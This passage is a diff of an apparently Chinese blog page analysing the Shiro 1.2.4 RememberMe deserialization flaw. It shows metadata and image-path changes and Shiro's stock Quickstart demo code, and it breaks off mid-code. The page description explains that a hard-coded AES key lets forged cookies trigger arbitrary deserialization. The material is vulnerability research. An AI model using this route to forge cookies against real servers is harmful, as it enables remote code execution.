@@ -26,62 +26,62 @@
 <meta property="og:site_name" content="l3yx&#39;s blog">
 <meta property="og:description" content="Shiro作为Java的一个安全框架，其中提供了登录时的RememberMe功能，让用户在浏览器关闭重新打开后依然能恢复之前的会话。而实现原理就是将储存用户身份的对象序列化并通过AES加密、base64编码储存在cookie中，只要能伪造cookie就能让服务器反序列化任意对象，而1.2.4版本及以下AES加密时采用的key是硬编码在代码中的，这就为伪造cookie提供了机会。只要remember">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321145837383.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321161842461.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162413295.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162537299.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162602475.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162720187.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321163758120.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170531049.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170728781.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321172033719.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321174309740.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201103424.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201229223.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201833615.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202502782.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202614429.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202938567.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321203344204.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204401719.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204557024.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205506865.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205933941.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205846991.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321210454929.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212123639.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212426443.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212650537.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321213458543.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321214045866.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321220720903.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221012855.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221502601.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221616027.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221705778.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321222156614.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321224754536.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235149421.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235309952.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000638321.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000820672.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000851697.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235751863.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322003851696.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322012002559.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322135132673.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133230697.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133300379.png">
-<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133333045.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321145837383.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321161842461.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162413295.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162537299.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162602475.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162720187.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321163758120.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170531049.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170728781.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321172033719.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321174309740.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201103424.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201229223.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201833615.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202502782.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202614429.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202938567.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321203344204.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204401719.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204557024.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205506865.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205933941.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205846991.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321210454929.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212123639.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212426443.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212650537.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321213458543.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321214045866.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321220720903.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221012855.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221502601.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221616027.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221705778.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321222156614.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321224754536.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235149421.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235309952.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000638321.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000820672.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000851697.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235751863.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322003851696.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322012002559.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322135132673.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133230697.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133300379.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133333045.png">
 <meta property="article:published_time" content="2020-03-21T05:43:04.000Z">
 <meta property="article:modified_time" content="2020-04-28T10:20:00.000Z">
 <meta property="article:author" content="淚笑">
 <meta property="article:tag" content="Java反序列化漏洞">
 <meta property="article:tag" content="Shiro">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png">
+<meta name="twitter:image" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png">
 
 
 <link rel="canonical" href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
@@ -271,6 +271,21 @@
     </span>
 
   
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>11 分钟</span>
+    </span>
 </div>
 
         </div>
@@ -290,12 +305,19 @@
 <p>首先看一下配置文件quickstart&#x2F;src&#x2F;main&#x2F;resources&#x2F;shiro.ini</p>
 <p>[users]中创建了几个用户并设置了其密码和角色</p>
 <p>[roles]中创建了不同角色及并设置了其权限</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png" alt="image-20200321144658861"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png" class="" title="image-20200321144658861">
+
+
+
 <p>然后查看我们运行的Demo代码</p>
 <p>&#x2F;quickstart&#x2F;src&#x2F;main&#x2F;java&#x2F;Quickstart.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Quickstart</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">transient</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(Quickstart.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 载入ini文件，创建Factory</span></span><br><span class="line">        <span class="comment">// 实际业务中应该是从数据库中加载账户信息等数据</span></span><br><span class="line">        Factory&lt;SecurityManager&gt; factory = <span class="keyword">new</span> <span class="title class_">IniSecurityManagerFactory</span>(<span class="string">&quot;classpath:shiro.ini&quot;</span>);</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> factory.getInstance();</span><br><span class="line"></span><br><span class="line">        SecurityUtils.setSecurityManager(securityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get the currently executing user:</span></span><br><span class="line">        <span class="type">Subject</span> <span class="variable">currentUser</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do some stuff with a Session (no need for a web or EJB container!!!)</span></span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> currentUser.getSession();</span><br><span class="line">        session.setAttribute(<span class="string">&quot;someKey&quot;</span>, <span class="string">&quot;aValue&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String) session.getAttribute(<span class="string">&quot;someKey&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (value.equals(<span class="string">&quot;aValue&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Retrieved the correct value! [&quot;</span> + value + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// let&#x27;s login the current user so we can check against roles and permissions:</span></span><br><span class="line">        <span class="keyword">if</span> (!currentUser.isAuthenticated()) &#123;</span><br><span class="line">            <span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(<span class="string">&quot;lonestarr&quot;</span>, <span class="string">&quot;vespa&quot;</span>);</span><br><span class="line">            token.setRememberMe(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                currentUser.login(token);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownAccountException uae) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;There is no user with username of &quot;</span> + token.getPrincipal());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IncorrectCredentialsException ice) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;Password for account &quot;</span> + token.getPrincipal() + <span class="string">&quot; was incorrect!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LockedAccountException lae) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;The account for username &quot;</span> + token.getPrincipal() + <span class="string">&quot; is locked.  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Please contact your administrator to unlock it.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ... catch more exceptions here (maybe custom ones specific to your application?</span></span><br><span class="line">            <span class="keyword">catch</span> (AuthenticationException ae) &#123;</span><br><span class="line">                <span class="comment">//unexpected condition?  error?</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//say who they are:</span></span><br><span class="line">        <span class="comment">//print their identifying principal (in this case, a username):</span></span><br><span class="line">        log.info(<span class="string">&quot;User [&quot;</span> + currentUser.getPrincipal() + <span class="string">&quot;] logged in successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//test a role:</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser.hasRole(<span class="string">&quot;schwartz&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;May the Schwartz be with you!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Hello, mere mortal.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//test a typed permission (not instance-level)</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser.isPermitted(<span class="string">&quot;lightsaber:wield&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;You may use a lightsaber ring.  Use it wisely.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Sorry, lightsaber rings are for schwartz masters only.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//a (very powerful) Instance Level permission:</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser.isPermitted(<span class="string">&quot;winnebago:drive:eagle5&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;You are permitted to &#x27;drive&#x27; the winnebago with license plate (id) &#x27;eagle5&#x27;.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Here are the keys - have fun!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span 